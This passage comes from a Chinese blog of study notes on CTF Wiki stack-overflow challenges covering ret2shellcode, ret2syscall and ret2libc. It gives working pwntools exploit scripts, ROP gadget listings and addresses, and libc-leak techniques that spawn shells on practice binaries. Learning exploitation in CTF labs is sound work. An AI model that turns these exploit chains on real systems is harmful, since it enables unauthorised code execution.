class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br> <br>sh = process(&#x27;./ret2shellcode&#x27;)<br><br>shellcode = asm(shellcraft.sh())<br>ret_addr = 0xffffd018<br><br>sh.sendline(shellcode.ljust(0x74, b&#x27;A&#x27;) + p32(ret_addr))<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>ret_addr 是gets(s)中变量s的地址，根据esp的偏移量计算得到</p><p>同时通过s的地址计算出了缓冲区长度0x70，加上32位程序的old_ebp的4位，溢出0x74长度再加返回地址ret_addr执行shellcode代码</p><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p><strong>原理 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_6">¶</a></strong></p><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p><p><strong>例子 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_7">¶</a></strong></p><p>这里我们继续以 bamboofox 中的 ret2syscall 为例。</p><p>链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p><p>checksec:</p><p><img src="/../00000000/image-20250216154449342.png" alt="image-20250216154449342"></p><p>ida32_main:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What do you plan to do?&quot;</span>);<br>  gets(&amp;v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个文章讲的总是和它的附件出入很大，所以我根据自己的分析学习它的知识点</p><p>可以看出这仍然是一个栈溢出，但是根据checksec的NX和ida的信息可以看到没办法通过ret2shellcode和ret2text来解决问题</p><p>这里学习一个知识，<strong>系统调用</strong></p><p>在<a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6">电脑</a>中，<strong>系统调用</strong>（英语：system call），指运行在<a href="https://zh.wikipedia.org/wiki/%E4%BD%BF%E7%94%A8%E8%80%85%E7%A9%BA%E9%96%93">用户空间</a>的<a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F">程序</a>向<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a><a href="https://zh.wikipedia.org/wiki/%E5%86%85%E6%A0%B8">内核</a>请求需要更高权限运行的服务。系统调用提供用户程序与<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>之间的接口。大多数系统交互式操作需求在内核态执行。如设备IO操作或者进程间通信。</p><p><strong>操作空间和内核空间</strong></p><p><a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>的进程空间可分为<a href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E7%A9%BA%E9%97%B4">用户空间</a>和<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E6%A0%B8%E7%A9%BA%E9%97%B4">内核空间</a>，它们需要不同的执行权限。其中系统调用运行在<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E6%A0%B8%E7%A9%BA%E9%97%B4">内核空间</a>。</p><p><strong>库函数</strong></p><p>系统调用和普通库函数调用非常相似，只是系统调用由操作系统<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E6%A0%B8">内核</a>提供，运行于内核核心态，而普通的库函数调用由函数库或用户自己提供，运行于用户态。</p><p><strong>经典实现</strong></p><p>Linux 在x86上的系统调用通过 int 80h 实现，用<a href="https://zh.wikipedia.org/w/index.php?title=%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7&action=edit&redlink=1">系统调用号</a>来区分入口函数。操作系统实现系统调用的基本过程是：</p><ol><li>应用程序调用库函数（API）；</li><li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li><li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li><li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li><li>中断处理函数返回到 API 中；</li><li>API 将 EAX 返回给应用程序。</li></ol><p>应用程序调用系统调用的过程是：</p><ol><li>把系统调用的编号存入 EAX；</li><li>把函数参数存入其它通用寄存器；</li><li>触发 0x80 号中断（int 0x80）。</li></ol><p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>)<br></code></pre></td></tr></table></figure><p>其中，该程序是 32 位，所以我们需要使得</p><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>而我们如何控制这些寄存器的值呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。</p><p>但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><p>首先，我们来寻找控制 eax 的 gadgets</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;<br>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x080bb196 : pop eax ; ret<br>0x0807217a : pop eax ; ret 0x80e<br>0x0804f704 : pop eax ; ret 3<br>0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<br></code></pre></td></tr></table></figure><p><img src="/../00000000/image-20250217212953149.png" alt="image-20250217212953149"></p><p>随后选取第二个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">➜  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;<br>0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret<br>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret<br>0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret<br>0x080be23f : pop ebx ; pop edi ; ret<br>0x0806eb69 : pop ebx ; pop edx ; ret<br>0x08092258 : pop ebx ; pop esi ; pop ebp ; ret<br>0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10<br>0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14<br>0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc<br>0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4<br>0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8<br>0x08048913 : pop ebx ; pop esi ; pop edi ; ret<br>0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4<br>0x08049a94 : pop ebx ; pop esi ; ret<br>0x080481c9 : pop ebx ; ret<br>0x080d7d3c : pop ebx ; ret 0x6f9<br>0x08099c87 : pop ebx ; ret 8<br>0x0806eb91 : pop ecx ; pop ebx ; ret<br>0x0806336b : pop edi ; pop esi ; pop ebx ; ret<br>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret<br>0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret<br>0x0805c820 : pop esi ; pop ebx ; ret<br>0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x0807b6ed : pop ss ; pop ebx ; ret<br></code></pre></td></tr></table></figure><p><img src="/../00000000/image-20250217213038792.png" alt="image-20250217213038792"></p><p>这里选取了0x0806eb90:  pop edx ; pop ecx ; pop ebx ; ret</p><p>可以控制三个寄存器的值</p><p>再利用ropgadget来寻找到’bin&#x2F;sh’的位置</p><p><img src="/../00000000/image-20250217213514583.png" alt="image-20250217213514583"></p><p>bin&#x2F;sh的地址是0x080be408</p><p>寻找int 80h的位置</p><p><img src="/../00000000/image-20250217213746901.png" alt="image-20250217213746901"></p><p>和文章的有点不一样但是没太大关系，我们只需要int 0x80就行了</p><p>其对应地址是0x08049421</p><p>接下来就是理解一下这exploit</p><p>其中 0xb 为 execve 对应的系统调用号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python<br>from pwn import *<br><br>sh = process(&#x27;./rop&#x27;)<br><br>pop_eax_ret = 0x080bb196<br>pop_edx_ecx_ebx_ret = 0x0806eb90<br>int_0x80 = 0x08049421<br>binsh = 0x80be408<br>payload = flat(<br>    [&#x27;A&#x27; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>我顺带分析一下这个栈的结构，以便更清晰地了解这个过程[]中的表示正常时候栈的位置情况</p><table><thead><tr><th align="center">0x08049421 [main函数的栈的内容]【int 0x80的地址】【高地址】</th></tr></thead><tbody><tr><td align="center">0x80be408 [main函数的栈的内容]【binsh的地址】</td></tr><tr><td align="center">0 [main函数的栈的内容]【ecx的值】</td></tr><tr><td align="center">0 [main函数的栈的内容] 【edx的值】</td></tr><tr><td align="center">[main函数的栈的内容]【pop_edx_ecx_ebx_ret_addr】</td></tr><tr><td align="center">0xb [main函数的栈的内容]【系统调用的eax的值】</td></tr><tr><td align="center">0x080bb196 [gets函数的ret_addr] 【pop_eax_ret_addr】</td></tr><tr><td align="center">溢出的A[gets函数的old_ebp]</td></tr><tr><td align="center">溢出的A[gets函数的栈]【低地址】</td></tr></tbody></table><p>随后具体流程就是先跳到ret_eax_addr，然后执行命令，然后再ret，最后再执行命令</p><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p><strong>原理 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_9">¶</a></strong></p><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至<strong>某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)</strong>。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。</p><p>例子：</p><p>文章由易到难给出了三个例子</p><p><strong>例一：</strong><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p><p>checksec :</p><p><img src="/../00000000/image-20250217210614031.png" alt="image-20250217210614031"></p><p>ida32_main:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>最明显的漏洞就是gets函数的栈溢出</p><p>ROPgadget:<br><img src="/../00000000/image-20250217212443212.png" alt="image-20250217212443212"></p><p>system()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.plt:08048460 ; int system(const char *command)<br></code></pre></td></tr></table></figure><p>exploit:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python<br>from pwn import *<br><br>sh = process(&#x27;./ret2libc1&#x27;)<br><br>binsh_addr = 0x8048720<br>system_plt = 0x08048460<br>payload = flat([b&#x27;a&#x27; * 112, system_plt, b&#x27;b&#x27; * 4, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>这里解释一下这个 b’b’*4 是用来当作虚假的返回地址，因为system函数也有返回地址，binsh_addr就是system的函数参数</p><p><strong>例二</strong>：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p><p>checksec :</p><p><img src="/../00000000/image-20250218093340605.png" alt="image-20250218093340605"></p><p>ida32_mian:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What do you think ?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们需要两个gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“&#x2F;bin&#x2F;sh”)。</p><p>这道题目的思路和ret2libc1基本一样，但是这个就没有&#x2F;bin&#x2F;sh，而是需要我们自己再bss段写入&#x2F;bin&#x2F;shx</p><p>exploit:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python3">##!/usr/bin/env python<br>from pwn import *<br><br>sh = process(&#x27;./ret2libc2&#x27;)<br><br>gets_plt = 0x08048460<br>system_plt = 0x08048490<br>pop_ebx = 0x0804843d<br>buf2 = 0x804a080<br>payload = flat(<br>    [b&#x27;a&#x27; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])<br>sh.sendline(payload)<br>sh.sendline(b&#x27;/bin/sh&#x27;)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>梳理一下这个ROPgadget的过程</p><p>第一次的gets：</p><table><thead><tr><th align="center">【高地址】</th></tr></thead><tbody><tr><td align="center">buf2  [ main的栈 ]</td></tr><tr><td align="center">0xdeadbeef   [ main的栈 ]</td></tr><tr><td align="center">system_addr   [ main的栈 ]</td></tr><tr><td align="center">buf2   [ main的栈 ]</td></tr><tr><td align="center">pop_ebx_addr   [ main的栈 ]</td></tr><tr><td align="center">gets_addr   [ gets_ret_addr ]</td></tr><tr><td align="center">‘a’   [ old_ebp ]</td></tr><tr><td align="center">‘a’   [ 缓冲区 ]</td></tr><tr><td align="center">【低地址】</td></tr></tbody></table><p>随后程序就再次ret到了gets函数</p><p>ret后，</p><p>各个寄存器的状态：</p><table><thead><tr><th>eip</th><th>gets_addr</th></tr></thead><tbody><tr><td>rbp</td><td>‘aaaa’</td></tr><tr><td>esp</td><td>pop_ebx_addr的存放的位置</td></tr></tbody></table><p>随后在get函数的角度应该</p><table><thead><tr><th align="center">【高地址】</th></tr></thead><tbody><tr><td align="center">buf2 [ main函数的栈 ]</td></tr><tr><td align="center">0xdeadbeef [ main函数的栈 ]</td></tr><tr><td align="center">system_addr [ main函数的栈 ]</td></tr><tr><td align="center">buf2 [ main函数的栈 ]</td></tr><tr><td align="center">pop_ebx_addr [ main函数的栈 ]</td></tr><tr><td align="center">【低地址】</td></tr></tbody></table><p><strong>解释为什么需要调用一个pop_ebx</strong></p><p>这里的ebx是代指通用寄存器，在调用完第一次gets之后我们还需要再调用一次gets然后gets函数的参数是由我们自己设计的，也就是buf2，但是自己设计参数后ret的返回地址就需要是system，但是从system函数的角度看我们就会不正确</p><p>现在对比一下如果没有这个pop的栈的情况</p><table><thead><tr><th align="center">高地址</th></tr></thead><tbody><tr><td align="center">buf2 [ system的参数 ]</td></tr><tr><td align="center">【按照gets函数的栈的结构来讲应该是buf2】【按照system函数的栈的结构来讲应该是它的system的返回地址喵】</td></tr><tr><td align="center">system_addr [ gets_2_ret_addr ]</td></tr><tr><td align="center">gets_addr [ ret_addr ]</td></tr><tr><td align="center">‘a’ [ old_ebp ]</td></tr><tr><td align="center">‘a’ [ 缓冲区 ]</td></tr><tr><td align="center">低地址</td></tr></tbody></table><p>如图所示会出现矛盾的情况，所以在调用两次及以上的带有参数的函数时，就需要pop来过度一下，在执行完system后程序就死了</p><p>但是我试了一下喵，死不死的和我有什么关系喵，我能getshell就行喵，容器坏了也不是我的问题喵</p><p><strong>gets函数的汇编代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gets:<br>    push ebp                ; 保存父函数的栈帧指针<br>    mov ebp, esp            ; 建立当前函数的栈帧<br><br>    mov eax, [ebp + 8]      ; 获取目标缓冲区的地址（gets 的参数）<br>    mov ebx, eax            ; 将目标缓冲区的地址保存到 ebx<br></code></pre></td></tr></table></figure><p><strong>32位子函数调用示意流程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .data<br>    ; 数据段（如果需要）<br><br>section .text<br>    global _start<br><br>_start:<br>    ; 主程序入口<br>    ; 调用 sub_function，传递两个参数：5 和 10<br>    push dword 10          ; 参数2（从右到左压栈）<br>    push dword 5           ; 参数1<br>    call sub_function      ; 调用子函数<br>    add esp, 8             ; 清理栈（移除两个参数）<br><br>    ; 程序结束<br>    mov eax, 1             ; 系统调用号：退出程序<br>    xor ebx, ebx           ; 返回值：0<br>    int 0x80               ; 触发系统调用<br><br>sub_function:<br>    ; 子函数入口<br>    push ebp                ; 保存父函数的栈帧指针<br>    mov ebp, esp            ; 建立当前函数的栈帧<br>    sub esp, 0x10           ; 分配局部变量空间（16字节）<br><br>    ; 访问参数<br>    mov eax, [ebp + 8]      ; 参数1（5）<br>    mov ebx, [ebp + 12]     ; 参数2（10）<br><br>    ; 执行一些操作（例如，将参数相加）<br>    add eax, ebx            ; eax = 参数1 + 参数2<br><br>    ; 函数返回<br>    mov esp, ebp            ; 恢复父函数的栈指针<br>    pop ebp                 ; 恢复父函数的栈帧指针<br>    ret                     ; 返回到调用点<br></code></pre></td></tr></table></figure><p><strong>例三：</strong><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p><p>checksec:</p><p><img src="/../00000000/image-20250218142512155.png" alt="image-20250218142512155"></p><p>在例题二的基础上，不仅去掉了&#x2F;bin&#x2F;sh的地址，system函数的地址也去掉了</p><p>ida32_main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Can you find it !?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点：</p><ul><li><p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</p></li><li><p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</p></li><li><p>而 libc 在 github 上有人进行收集，如下: <a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></p></li></ul><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考:<a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a> [ readme ]</p><p>此外，在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。</p><p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 &#x2F;bin&#x2F;sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘&#x2F;bin&#x2F;sh’)</li></ul><p>exploit:  [ 非原文 ]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br>e = ELF(&quot;./ret2libc3&quot;)<br>libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;) #确定libc库并解析<br>p = process(&quot;./ret2libc3&quot;)<br>puts_plt = e.plt[&#x27;puts&#x27;] #puts函数的入口地址<br>puts_got = e.got[&#x27;puts&#x27;]  #puts函数的got表地址<br>start_addr = e.symbols[&#x27;_start&#x27;] #程序的起始地址<br>payload1 = b&#x27;a&#x27; * 112 + p32(puts_plt) + p32(start_addr) + p32(puts_got)<br>#attach(p, &quot;b *0x0804868F&quot;)<br>#pause()<br>p.sendlineafter(&quot;Can you find it !?&quot;, payload1)<br>puts_real_addr = u32(p.recv()[0:4])  #接收puts的真实地址，占4个字节<br>print(&quot;puts_plt:&#123;&#125;, puts_got: &#123;&#125;, start_addr: &#123;&#125;&quot;.format(hex(puts_plt),hex(puts_got), hex(start_addr)))<br>print(&quot;puts_real_addr: &quot;, hex(puts_real_addr)) <br>libc_addr = puts_real_addr - libc.sym[&#x27;puts&#x27;] #计算libc库的基地址<br>print(hex(libc_addr))<br>system_addr = libc_addr + libc.sym[&quot;system&quot;] #计算system函数的真实地址<br>binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))  #计算binsh字符串的真实地址<br>payload2 = b&#x27;a&#x27; * 112 + p32(system_addr) + b&quot;aaaa&quot; + p32(binsh_addr)<br>#pause()<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>payload1构造设计：</p><p><img src="/../00000000/image-20250219212110586.png" 